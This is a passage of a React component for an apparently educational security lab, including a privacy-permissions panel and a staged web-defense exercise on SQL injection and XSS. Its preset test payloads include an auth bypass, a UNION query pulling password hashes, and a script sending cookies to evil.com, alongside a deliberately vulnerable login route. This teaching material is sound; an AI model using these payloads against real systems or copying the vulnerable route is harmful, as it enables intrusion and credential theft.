                  <div style={{ fontSize: '1.25rem', fontWeight: 800, color: iotTemp >= iotThreshold ? 'var(--danger)' : 'var(--success)' }}>
                    {iotTemp >= iotThreshold ? 'FAN ON (COOLING CYCLE ACTIVE)' : 'FAN OFF (NORMAL AMBIENT)'}
                  </div>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                  {iotTemp >= iotThreshold ? (
                    <Wind size={26} color="var(--danger)" />
                  ) : (
                    <Zap size={26} color="var(--text-muted)" />
                  )}
                </div>
              </div>

              {/* Event Logs */}
              <div>
                <div style={{ fontSize: '0.8rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '8px' }}>
                  MQTT Telemetry Event Log
                </div>
                <div style={{ maxHeight: '140px', overflowY: 'auto', backgroundColor: 'var(--editor-bg)', border: '1px solid var(--border-subtle)', borderRadius: '6px', padding: '10px', fontFamily: 'var(--font-mono)', fontSize: '0.78rem', display: 'flex', flexDirection: 'column', gap: '4px' }}>
                  {iotEventLogs.map((log, i) => (
                    <div key={i} style={{ color: 'var(--text-secondary)' }}>{log}</div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 4: DIGITAL PRIVACY DECISION LAB               */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-t4-privacy-decision' && (
            <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
              <div style={{ fontWeight: 700, fontSize: '1rem', color: 'var(--text-primary)' }}>
                Application Permissions & Data Sharing Radar
              </div>

              {/* Real-time SVG Privacy Exposure Radar */}
              <PrivacyRadarSvg
                location={privacyLocation}
                contacts={privacyContacts}
                mic={privacyMic}
                adTracking={privacyAdTracking}
                exposureScore={privacyScore}
              />

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '14px' }}>
                <label style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '14px', borderRadius: '8px', border: '1px solid var(--border-subtle)', cursor: 'pointer' }}>
                  <input
                    type="checkbox"
                    checked={privacyLocation}
                    onChange={(e) => setPrivacyLocation(e.target.checked)}
                    style={{ width: '18px', height: '18px' }}
                  />
                  <div>
                    <div style={{ fontWeight: 600, fontSize: '0.88rem' }}>Precise GPS Location</div>
                    <div style={{ fontSize: '0.78rem', color: 'var(--text-muted)' }}>Exposes real-time coordinates (+30% risk)</div>
                  </div>
                </label>

                <label style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '14px', borderRadius: '8px', border: '1px solid var(--border-subtle)', cursor: 'pointer' }}>
                  <input
                    type="checkbox"
                    checked={privacyContacts}
                    onChange={(e) => setPrivacyContacts(e.target.checked)}
                    style={{ width: '18px', height: '18px' }}
                  />
                  <div>
                    <div style={{ fontWeight: 600, fontSize: '0.88rem' }}>Full Address Book</div>
                    <div style={{ fontSize: '0.78rem', color: 'var(--text-muted)' }}>Exposes social graph (+35% risk)</div>
                  </div>
                </label>

                <label style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '14px', borderRadius: '8px', border: '1px solid var(--border-subtle)', cursor: 'pointer' }}>
                  <input
                    type="checkbox"
                    checked={privacyMic}
                    onChange={(e) => setPrivacyMic(e.target.checked)}
                    style={{ width: '18px', height: '18px' }}
                  />
                  <div>
                    <div style={{ fontWeight: 600, fontSize: '0.88rem' }}>Background Microphone</div>
                    <div style={{ fontSize: '0.78rem', color: 'var(--text-muted)' }}>Ambient audio capture (+20% risk)</div>
                  </div>
                </label>

                <label style={{ display: 'flex', alignItems: 'center', gap: '10px', padding: '14px', borderRadius: '8px', border: '1px solid var(--border-subtle)', cursor: 'pointer' }}>
                  <input
                    type="checkbox"
                    checked={privacyAdTracking}
                    onChange={(e) => setPrivacyAdTracking(e.target.checked)}
                    style={{ width: '18px', height: '18px' }}
                  />
                  <div>
                    <div style={{ fontWeight: 600, fontSize: '0.88rem' }}>Cross-App Ad Tracking</div>
                    <div style={{ fontSize: '0.78rem', color: 'var(--text-muted)' }}>Behavioral profiling (+10% risk)</div>
                  </div>
                </label>
              </div>

              {/* Privacy Exposure Gauge */}
              <div
                style={{
                  padding: '20px',
                  borderRadius: '10px',
                  backgroundColor: privacyScore > 50 ? 'var(--danger-bg)' : privacyScore > 25 ? 'var(--warning-bg)' : 'var(--success-bg)',
                  border: privacyScore > 50 ? '1px solid var(--danger-border)' : privacyScore > 25 ? '1px solid var(--warning-border)' : '1px solid var(--success-border)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                }}
              >
                <div>
                  <div style={{ fontSize: '0.78rem', fontWeight: 800, textTransform: 'uppercase', color: 'var(--text-secondary)' }}>
                    CALCULATED PRIVACY EXPOSURE
                  </div>
                  <div style={{ fontSize: '1.4rem', fontWeight: 800, color: privacyScore > 50 ? 'var(--danger)' : privacyScore > 25 ? 'var(--warning)' : 'var(--success)' }}>
                    {privacyScore}% ({privacyScore < 25 ? 'MINIMIZED SAFE TIER' : privacyScore < 60 ? 'MODERATE RISK' : 'CRITICAL EXPOSURE'})
                  </div>
                </div>
                <div style={{ fontWeight: 700, fontSize: '0.9rem', color: 'var(--text-primary)' }}>
                  Goal: &lt; 25%
                </div>
              </div>
            </div>
          )}

          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 5: DEFENSIVE WEB SECURITY LAB                 */}
          {/* -------------------------------------------------------- */}
          {/* -------------------------------------------------------- */}
          {/* LAB ENGINE 5: DEFENSIVE WEB SECURITY (Gate 2 Slice)       */}
          {/* -------------------------------------------------------- */}
          {lab.id === 'lab-t5-web-defense' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
              {/* Header Context & Accessibility Control */}
              <div
                className="card"
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  flexWrap: 'wrap',
                  gap: '12px',
                  backgroundColor: 'var(--bg-surface)',
                  border: '1px solid var(--border-subtle)',
                }}
              >
                <div>
                  <div style={{ fontWeight: 800, fontSize: '1.05rem', color: 'var(--text-primary)' }}>
                    Web Security Defense &amp; Query Interception Pipeline
                  </div>
                  <div style={{ fontSize: '0.82rem', color: 'var(--text-secondary)', marginTop: '2px' }}>
                    Vertical Pedagogical Slice: Prediction &rarr; Simulation &rarr; Diagnostic Code Refactoring &rarr; AST Wire Explanation
                  </div>
                </div>

                <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                  <button
                    type="button"
                    onClick={() => setSecReducedMotion((prev) => !prev)}
                    className="btn-secondary"
                    style={{ height: '32px', fontSize: '0.75rem', padding: '0 10px' }}
                    aria-pressed={secReducedMotion}
                    title="Toggle reduced motion for animations"
                  >
                    <span>{secReducedMotion ? 'Motion: Reduced' : 'Motion: Animated'}</span>
                  </button>
                  <span
                    style={{
                      fontSize: '0.75rem',
                      fontFamily: 'var(--font-mono)',
                      padding: '4px 8px',
                      borderRadius: '6px',
                      backgroundColor: 'var(--bg-canvas)',
                      border: '1px solid var(--border-subtle)',
                      color: 'var(--text-secondary)',
                    }}
                  >
                    Session: {secSessionId ? secSessionId.substring(0, 8) + '...' : 'active'}
                  </span>
                </div>
              </div>

              {/* ============================================================== */}
              {/* STAGE 1: MEANINGFUL ARCHITECTURAL PREDICTION CHALLENGE          */}
              {/* ============================================================== */}
              <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <span
                      style={{
                        fontSize: '0.72rem',
                        fontWeight: 800,
                        backgroundColor: secPredictionSubmitted && secPredictionAnswer === 'ast_mutation' ? 'var(--success)' : 'var(--accent-primary)',
                        color: '#FFFFFF',
                        padding: '2px 8px',
                        borderRadius: '12px',
                        letterSpacing: '0.04em',
                      }}
                    >
                      STAGE 1
                    </span>
                    <span style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
                      Architectural Prediction Challenge
                    </span>
                  </div>
                  <span style={{ fontSize: '0.78rem', color: secPredictionSubmitted && secPredictionAnswer === 'ast_mutation' ? 'var(--success)' : 'var(--text-secondary)', fontWeight: 600 }}>
                    {secPredictionSubmitted && secPredictionAnswer === 'ast_mutation' ? '✓ Stage Verified' : 'Action Required'}
                  </span>
                </div>

                <p style={{ fontSize: '0.88rem', color: 'var(--text-secondary)', lineHeight: 1.5 }}>
                  Before testing in the interactive sandbox, analyze the attacker&apos;s exploit payload:
                  When an attacker supplies the input <code>&apos; OR &apos;1&apos;=&apos;1</code> into a query constructed via direct string concatenation (<code>&quot;SELECT * FROM users WHERE email = &apos;&quot; + input + &quot;&apos;&quot;</code>), what fundamental operation occurs at the database parser level?
                </p>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                  {[
                    {
                      id: 'ast_mutation',
                      text: "The lexical analyzer splits the input into language tokens (OR, literal '1', equals operator, literal '1'), fundamentally mutating the query's Abstract Syntax Tree (AST) so the WHERE condition permanently evaluates to TRUE.",
                    },
                    {
                      id: 'lexer_error',
                      text: 'The database parser immediately throws an unhandled syntax error and terminates execution because string literals cannot contain single apostrophes.',
                    },
                    {
                      id: 'auto_escape',
                      text: 'The database server engine automatically detects apostrophes in untrusted data and applies escaping without developer configuration.',
                    },
                    {
                      id: 'waf_drop',
                      text: 'The Node.js HTTP server detects the payload string and drops the TCP socket before transmitting the query over the wire.',
                    },
                  ].map((option) => (
                    <label
                      key={option.id}
                      style={{
                        display: 'flex',
                        alignItems: 'flex-start',
                        gap: '10px',
                        padding: '12px',
                        borderRadius: '8px',
                        border: secPredictionAnswer === option.id ? '2px solid var(--accent-primary)' : '1px solid var(--border-subtle)',
                        backgroundColor: secPredictionAnswer === option.id ? 'rgba(36, 76, 58, 0.04)' : 'var(--bg-surface)',
                        cursor: secPredictionSubmitted ? 'default' : 'pointer',
                        fontSize: '0.85rem',
                        lineHeight: 1.45,
                      }}
                    >
                      <input
                        type="radio"
                        name="secPredictionOption"
                        checked={secPredictionAnswer === option.id}
                        disabled={secPredictionSubmitted}
                        onChange={() => setSecPredictionAnswer(option.id)}
                        style={{ marginTop: '3px' }}
                      />
                      <span>{option.text}</span>
                    </label>
                  ))}
                </div>

                {!secPredictionSubmitted ? (
                  <div>
                    <button
                      type="button"
                      onClick={handleLockPrediction}
                      disabled={!secPredictionAnswer}
                      className="btn-primary"
                      style={{ height: '36px', padding: '0 16px', opacity: secPredictionAnswer ? 1 : 0.5 }}
                    >
                      Lock In Architectural Prediction
                    </button>
                  </div>
                ) : (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                    <div
                      style={{
                        padding: '12px 14px',
                        borderRadius: '8px',
                        backgroundColor: secPredictionAnswer === 'ast_mutation' ? 'rgba(22, 163, 74, 0.1)' : 'rgba(239, 68, 68, 0.1)',
                        border: `1px solid ${secPredictionAnswer === 'ast_mutation' ? 'var(--success)' : 'var(--danger)'}`,
                        fontSize: '0.84rem',
                        lineHeight: 1.5,
                      }}
                    >
                      <div style={{ fontWeight: 700, color: secPredictionAnswer === 'ast_mutation' ? 'var(--success)' : 'var(--danger)', marginBottom: '4px' }}>
                        {secPredictionAnswer === 'ast_mutation' ? '✓ Correct Architectural Insight' : '✕ Flawed Prediction'}
                      </div>
                      <div style={{ color: 'var(--text-primary)' }}>
                        {secPredictionAnswer === 'ast_mutation'
                          ? "Direct string concatenation forces the database parser to treat incoming characters as language keywords. Because the parser cannot distinguish developer-intended grammar from untrusted user text, the WHERE clause's AST branch evaluates as TRUE for every table row."
                          : "Direct string concatenation does NOT produce automatic escaping or connection dropping. The database parser faithfully parses untrusted input into active SQL grammar nodes, mutating the AST logic."}
                      </div>
                    </div>

                    {secPredictionAnswer !== 'ast_mutation' && (
                      <div>
                        <button
                          type="button"
                          onClick={() => setSecPredictionSubmitted(false)}
                          className="btn-secondary"
                          style={{ height: '32px', padding: '0 14px', fontSize: '0.8rem' }}
                        >
                          Revise &amp; Retry Prediction
                        </button>
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* ============================================================== */}
              {/* STAGE 2: FUNCTIONING INTERACTIVE SIMULATION (Defense Pipeline) */}
              {/* ============================================================== */}
              <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <span
                      style={{
                        fontSize: '0.72rem',
                        fontWeight: 800,
                        backgroundColor: secSimulationRan && secParamQueries && secOutputEncoding ? 'var(--success)' : 'var(--accent-primary)',
                        color: '#FFFFFF',
                        padding: '2px 8px',
                        borderRadius: '12px',
                        letterSpacing: '0.04em',
                      }}
                    >
                      STAGE 2
                    </span>
                    <span style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
                      Interactive Defense-in-Depth Pipeline Simulation
                    </span>
                  </div>
                  <span style={{ fontSize: '0.78rem', color: secSimulationRan && secParamQueries && secOutputEncoding ? 'var(--success)' : 'var(--text-secondary)', fontWeight: 600 }}>
                    {secSimulationRan && secParamQueries && secOutputEncoding ? '✓ Pipeline Hardened' : 'Configuration Required'}
                  </span>
                </div>

                {/* Real-time SVG Security Pipeline */}
                <SecurityPipelineSvg
                  paramQueries={secParamQueries}
                  outputEncoding={secOutputEncoding}
                  strictCsp={secCsp}
                  payload={secQueryInput}
                  isSimulating={secIsSimulating}
                  forceReducedMotion={secReducedMotion}
                />

                {/* Preset Attack Vectors */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <label style={{ fontSize: '0.82rem', fontWeight: 600, color: 'var(--text-secondary)' }}>
                    Quick-Load Test Payloads:
                  </label>
                  <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                    {[
                      { label: "SQL Auth Bypass (' OR '1'='1)", payload: "' OR '1'='1" },
                      { label: "SQL Union Exfiltration", payload: "' UNION SELECT 1, email, password_hash FROM admin_users --" },
                      { label: "XSS Reflected Script", payload: "<script>fetch('http://evil.com/leak?c=' + document.cookie)</script>" },
                      { label: "Benign Valid Email", payload: "student.dev@geniusphere.org" },
                    ].map((preset, idx) => (
                      <button
                        key={idx}
                        type="button"
                        onClick={() => setSecQueryInput(preset.payload)}
                        className="btn-secondary"
                        style={{ height: '30px', fontSize: '0.76rem', padding: '0 10px' }}
                      >
                        {preset.label}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Input Field */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <label style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-secondary)' }}>
                    Simulated Untrusted Input Payload
                  </label>
                  <input
                    type="text"
                    value={secQueryInput}
                    onChange={(e) => setSecQueryInput(e.target.value)}
                    className="form-input"
                    style={{ fontFamily: 'var(--font-mono)', fontSize: '0.85rem' }}
                  />
                </div>

                {/* Defense Gates Toggles */}
                <div style={{ display: 'flex', gap: '16px', flexWrap: 'wrap' }}>
                  <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.88rem' }}>
                    <input
                      type="checkbox"
                      checked={secParamQueries}
                      onChange={(e) => setSecParamQueries(e.target.checked)}
                    />
                    <span style={{ fontWeight: 600 }}>Enable Parameterized Queries (?)</span>
                  </label>

                  <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.88rem' }}>
                    <input
                      type="checkbox"
                      checked={secOutputEncoding}
                      onChange={(e) => setSecOutputEncoding(e.target.checked)}
                    />
                    <span style={{ fontWeight: 600 }}>Enable Context-Aware HTML Encoding</span>
                  </label>

                  <label style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer', fontSize: '0.88rem' }}>
                    <input
                      type="checkbox"
                      checked={secCsp}
                      onChange={(e) => setSecCsp(e.target.checked)}
                    />
                    <span style={{ fontWeight: 600 }}>Enable Strict CSP</span>
                  </label>
                </div>

                <div>
                  <button
                    type="button"
                    onClick={handleRunSecurityTests}
                    className="btn-primary"
                    style={{ height: '38px', padding: '0 18px' }}
                  >
                    <Play size={15} />
                    <span>Execute Security Diagnostic</span>
                  </button>
                </div>

                {secExecutionLog.length > 0 && (
                  <div
                    style={{
                      backgroundColor: 'var(--editor-bg)',
                      border: '1px solid var(--border-subtle)',
                      borderRadius: '8px',
                      padding: '14px',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '6px',
                      fontFamily: 'var(--font-mono)',
                      fontSize: '0.82rem',
                    }}
                    role="log"
                    aria-label="Security Pipeline Diagnostic Log"
                  >
                    {secExecutionLog.map((log, i) => (
                      <div key={i} style={{ color: log.startsWith('✓') ? 'var(--success)' : log.startsWith('!') ? '#F59E0B' : 'var(--danger)' }}>
                        {log}
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {/* ============================================================== */}
              {/* STAGE 3: DEBUGGING & DIAGNOSTIC CODE REFACTORING EXERCISE      */}
              {/* ============================================================== */}
              <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <span
                      style={{
                        fontSize: '0.72rem',
                        fontWeight: 800,
                        backgroundColor: secDiagnosticSubmitted && secDiagnosticAnswer === 'prepared_statement' ? 'var(--success)' : 'var(--accent-primary)',
                        color: '#FFFFFF',
                        padding: '2px 8px',
                        borderRadius: '12px',
                        letterSpacing: '0.04em',
                      }}
                    >
                      STAGE 3
                    </span>
                    <span style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
                      Diagnostic Code Refactoring Exercise
                    </span>
                  </div>
                  <span style={{ fontSize: '0.78rem', color: secDiagnosticSubmitted && secDiagnosticAnswer === 'prepared_statement' ? 'var(--success)' : 'var(--text-secondary)', fontWeight: 600 }}>
                    {secDiagnosticSubmitted && secDiagnosticAnswer === 'prepared_statement' ? '✓ Stage Verified' : 'Action Required'}
                  </span>
                </div>

                <p style={{ fontSize: '0.88rem', color: 'var(--text-secondary)', lineHeight: 1.5 }}>
                  Inspect this vulnerable Express.js authentication route handler. Direct string concatenation creates a critical CWE-89 vulnerability:
                </p>

                {/* Monospace Code Display */}
                <div
                  style={{
                    backgroundColor: 'var(--editor-bg)',
                    border: '1px solid var(--border-subtle)',
                    borderRadius: '8px',
                    padding: '14px',
                    fontFamily: 'var(--font-mono)',
                    fontSize: '0.82rem',
                    color: 'var(--text-primary)',
                    lineHeight: 1.5,
                  }}
                >
                  <div style={{ color: '#6B7280' }}>// Insecure Express Endpoint Handler</div>
                  <div>app.post(&apos;/api/v1/auth/login&apos;, async (req, res) =&gt; &#123;</div>
                  <div style={{ paddingLeft: '16px' }}>const &#123; email, password &#125; = req.body;</div>
                  <div style={{ paddingLeft: '16px', color: 'var(--danger)', backgroundColor: 'rgba(239, 68, 68, 0.08)' }}>
                    // VULNERABLE: Direct string concatenation allows AST injection
                  </div>
                  <div style={{ paddingLeft: '16px', color: 'var(--danger)' }}>
                    const sql = &quot;SELECT id, email, role FROM users WHERE email = &apos;&quot; + email + &quot;&apos; AND password = &apos;&quot; + password + &quot;&apos;&quot;;
                  </div>
                  <div style={{ paddingLeft: '16px' }}>const user = await rawDbQuery(sql);</div>
                  <div style={{ paddingLeft: '16px' }}>return res.json(user);</div>
                  <div>&#125;);</div>
                </div>

                <div style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-primary)' }}>
                  Select the secure production-grade implementation:
                </div>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                  {[
                    {
                      id: 'prepared_statement',
                      title: 'Option A: Parameterized Prepared Statement (?)',
                      code: 'const sql = "SELECT id, email, role FROM users WHERE email = ? AND password = ?";\nconst user = await db.query(sql, [email, password]);',
                    },
                    {
                      id: 'client_replace',
                      title: 'Option B: Escape Single Quotes via Replace',
                      code: "const safeEmail = email.replace(/'/g, \"''\");\nconst sql = \"SELECT id, email, role FROM users WHERE email = '\" + safeEmail + \"'\";",
                    },
                    {
                      id: 'regex_strip',
                      title: 'Option C: Blacklist Keyword Regex Stripping',
                      code: "const clean = email.replace(/select|or|and|--/gi, '');\nconst sql = \"SELECT * FROM users WHERE email = '\" + clean + \"'\";",
                    },
                    {
                      id: 'encode_uri',
                      title: 'Option D: URL Component Encoding',
                      code: "const sql = \"SELECT * FROM users WHERE email = '\" + encodeURIComponent(email) + \"'\";",
                    },
                  ].map((option) => (
                    <label
                      key={option.id}
                      style={{
                        display: 'flex',
                        alignItems: 'flex-start',
                        gap: '10px',
                        padding: '12px',
                        borderRadius: '8px',
                        border: secDiagnosticAnswer === option.id ? '2px solid var(--accent-primary)' : '1px solid var(--border-subtle)',
                        backgroundColor: secDiagnosticAnswer === option.id ? 'rgba(36, 76, 58, 0.04)' : 'var(--bg-surface)',
                        cursor: secDiagnosticSubmitted ? 'default' : 'pointer',
                        fontSize: '0.82rem',
                      }}
                    >
                      <input
                        type="radio"
                        name="secDiagnosticOption"
                        checked={secDiagnosticAnswer === option.id}
                        disabled={secDiagnosticSubmitted}
                        onChange={() => setSecDiagnosticAnswer(option.id)}
                        style={{ marginTop: '3px' }}
                      />
                      <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                        <span style={{ fontWeight: 700, color: 'var(--text-primary)' }}>{option.title}</span>
                        <pre style={{ margin: 0, fontFamily: 'var(--font-mono)', fontSize: '0.78rem', color: 'var(--text-secondary)', whiteSpace: 'pre-wrap' }}>
                          {option.code}
                        </pre>
                      </div>
                    </label>
                  ))}
                </div>

                {!secDiagnosticSubmitted ? (
                  <div>
                    <button
                      type="button"
                      onClick={handleVerifyDiagnostic}
                      disabled={!secDiagnosticAnswer}
                      className="btn-primary"
                      style={{ height: '36px', padding: '0 16px', opacity: secDiagnosticAnswer ? 1 : 0.5 }}
                    >
                      Submit Diagnostic Solution
                    </button>
                  </div>
                ) : (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                    <div
                      style={{
                        padding: '12px 14px',
                        borderRadius: '8px',
                        backgroundColor: secDiagnosticAnswer === 'prepared_statement' ? 'rgba(22, 163, 74, 0.1)' : 'rgba(239, 68, 68, 0.1)',
                        border: `1px solid ${secDiagnosticAnswer === 'prepared_statement' ? 'var(--success)' : 'var(--danger)'}`,
                        fontSize: '0.84rem',
                        lineHeight: 1.5,
                      }}
                    >
                      <div style={{ fontWeight: 700, color: secDiagnosticAnswer === 'prepared_statement' ? 'var(--success)' : 'var(--danger)', marginBottom: '4px' }}>
                        {secDiagnosticAnswer === 'prepared_statement' ? '✓ Correct Diagnostic Refactoring' : '✕ Flawed Diagnostic Solution'}
                      </div>
                      <div style={{ color: 'var(--text-primary)' }}>
                        {secDiagnosticAnswer === 'prepared_statement'
                          ? 'Using query placeholders (?) tells the database driver to transmit the query string and user parameters across separate network frames. The database engine parses the SQL syntax first, and subsequently binds values as strictly literal bytes.'
                          : 'Ad-hoc character stripping and regex blacklisting are notoriously fragile. Attackers bypass them with alternate SQL delimiters, double-nesting (e.g., sSELECTelect), or character encoding homoglyphs. Prepared statements are mandatory.'}
                      </div>
                    </div>

                    {secDiagnosticAnswer !== 'prepared_statement' && (
                      <div>
                        <button
                          type="button"
                          onClick={() => setSecDiagnosticSubmitted(false)}
                          className="btn-secondary"
                          style={{ height: '32px', padding: '0 14px', fontSize: '0.8rem' }}
                        >
                          Retry Diagnostic Refactoring
                        </button>
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* ============================================================== */}
              {/* STAGE 4: COMPUTER SCIENCE EXPLANATION CHECKPOINT               */}
              {/* ============================================================== */}
              <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <span
                      style={{
                        fontSize: '0.72rem',
                        fontWeight: 800,
                        backgroundColor: secExplanationSubmitted && secExplanationAnswer === 'ast_precompile' ? 'var(--success)' : 'var(--accent-primary)',
                        color: '#FFFFFF',
                        padding: '2px 8px',
                        borderRadius: '12px',
                        letterSpacing: '0.04em',
                      }}
                    >
                      STAGE 4
                    </span>
                    <span style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
                      Computer Science Explanation Checkpoint
                    </span>
                  </div>
                  <span style={{ fontSize: '0.78rem', color: secExplanationSubmitted && secExplanationAnswer === 'ast_precompile' ? 'var(--success)' : 'var(--text-secondary)', fontWeight: 600 }}>
                    {secExplanationSubmitted && secExplanationAnswer === 'ast_precompile' ? '✓ Stage Verified' : 'Action Required'}
                  </span>
                </div>

                <p style={{ fontSize: '0.88rem', color: 'var(--text-secondary)', lineHeight: 1.5 }}>
                  Why does parameterization fundamentally stop SQL injection attacks, whereas regex-based sanitization and character stripping frequently fail?
                </p>

                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                  {[
                    {
                      id: 'ast_precompile',
                      text: 'Parameterization separates the syntax compilation phase from data transmission across the wire protocol. The database engine pre-compiles the Abstract Syntax Tree (AST) query plan before variables arrive, guaranteeing that incoming parameters are treated exclusively as literal scalar data.',
                    },
                    {
                      id: 'sha256_hash',
                      text: 'Parameterization computes a cryptographic SHA-256 hash of the entire request body before sending it to the database table.',
                    },
                    {
                      id: 'tls_in_memory',
                      text: 'Parameterization activates mutual TLS 1.3 within server memory to encrypt all table column names.',
                    },
                    {
                      id: 'c_transpile',
                      text: 'Parameterization recompiles JavaScript routes into native C++ binaries that automatically delete quotation marks.',
                    },
                  ].map((option) => (
                    <label
                      key={option.id}
                      style={{
                        display: 'flex',
                        alignItems: 'flex-start',
                        gap: '10px',
                        padding: '12px',
                        borderRadius: '8px',
                        border: secExplanationAnswer === option.id ? '2px solid var(--accent-primary)' : '1px solid var(--border-subtle)',
                        backgroundColor: secExplanationAnswer === option.id ? 'rgba(36, 76, 58, 0.04)' : 'var(--bg-surface)',
                        cursor: secExplanationSubmitted ? 'default' : 'pointer',
                        fontSize: '0.85rem',
                        lineHeight: 1.45,
                      }}
                    >
                      <input
                        type="radio"
                        name="secExplanationOption"
                        checked={secExplanationAnswer === option.id}
                        disabled={secExplanationSubmitted}
                        onChange={() => setSecExplanationAnswer(option.id)}
                        style={{ marginTop: '3px' }}
                      />
                      <span>{option.text}</span>
                    </label>
                  ))}
                </div>

                {!secExplanationSubmitted ? (
                  <div>
                    <button
                      type="button"
                      onClick={handleVerifyExplanation}
                      disabled={!secExplanationAnswer}
                      className="btn-primary"
                      style={{ height: '36px', padding: '0 16px', opacity: secExplanationAnswer ? 1 : 0.5 }}
                    >
                      Verify Conceptual Understanding
                    </button>
                  </div>
                ) : (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                    <div
                      style={{
                        padding: '12px 14px',
                        borderRadius: '8px',
                        backgroundColor: secExplanationAnswer === 'ast_precompile' ? 'rgba(22, 163, 74, 0.1)' : 'rgba(239, 68, 68, 0.1)',
                        border: `1px solid ${secExplanationAnswer === 'ast_precompile' ? 'var(--success)' : 'var(--danger)'}`,
                        fontSize: '0.84rem',
                        lineHeight: 1.5,
                      }}
                    >
                      <div style={{ fontWeight: 700, color: secExplanationAnswer === 'ast_precompile' ? 'var(--success)' : 'var(--danger)', marginBottom: '4px' }}>
                        {secExplanationAnswer === 'ast_precompile' ? '✓ Mastered Conceptual Foundation' : '✕ Incomplete Explanation'}
                      </div>
                      <div style={{ color: 'var(--text-primary)' }}>
                        {secExplanationAnswer === 'ast_precompile'
                          ? 'This is the core distinction: string sanitizers attempt to guess whether characters are hostile at the application layer. Parameterization enforces compiler-level boundary separation at the database wire protocol layer. Because the execution plan is frozen prior to parameter substitution, data can never become code.'
                          : 'Hashing, TLS, and transpilation do not alter how the database query compiler interprets incoming tokens. Compiler boundary separation via parameterized ASTs is the only true architectural mitigation.'}
                      </div>
                    </div>

                    {secExplanationAnswer !== 'ast_precompile' && (
                      <div>
                        <button
                          type="button"
                          onClick={() => setSecExplanationSubmitted(false)}
                          className="btn-secondary"
                          style={{ height: '32px', padding: '0 14px', fontSize: '0.8rem' }}
                        >
                          Retry Explanation Checkpoint
                        </button>
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* ============================================================== */}
              {/* STAGE VERIFICATION SUMMARY & SUBMISSION BANNER                 */}
              {/* ============================================================== */}
              <div
                className="card"
                style={{
                  backgroundColor: checkedCriteria.every(Boolean) ? 'rgba(22, 163, 74, 0.05)' : 'var(--bg-surface)',
                  border: `1.5px solid ${checkedCriteria.every(Boolean) ? 'var(--success)' : 'var(--border-subtle)'}`,
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '12px',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '8px' }}>
                  <div style={{ fontWeight: 800, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
                    Pedagogical Slice Progress: {checkedCriteria.filter(Boolean).length} / 4 Stages Validated
                  </div>
                  <span
                    style={{
                      fontSize: '0.78rem',
                      fontWeight: 700,
                      padding: '4px 10px',
                      borderRadius: '12px',
                      backgroundColor: checkedCriteria.every(Boolean) ? 'var(--success)' : 'var(--border-subtle)',
                      color: checkedCriteria.every(Boolean) ? '#FFFFFF' : 'var(--text-secondary)',
                    }}
                  >
                    {checkedCriteria.every(Boolean) ? '100% Complete - Ready to Submit' : 'In Progress'}
                  </span>
                </div>

                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '8px' }}>
                  {[
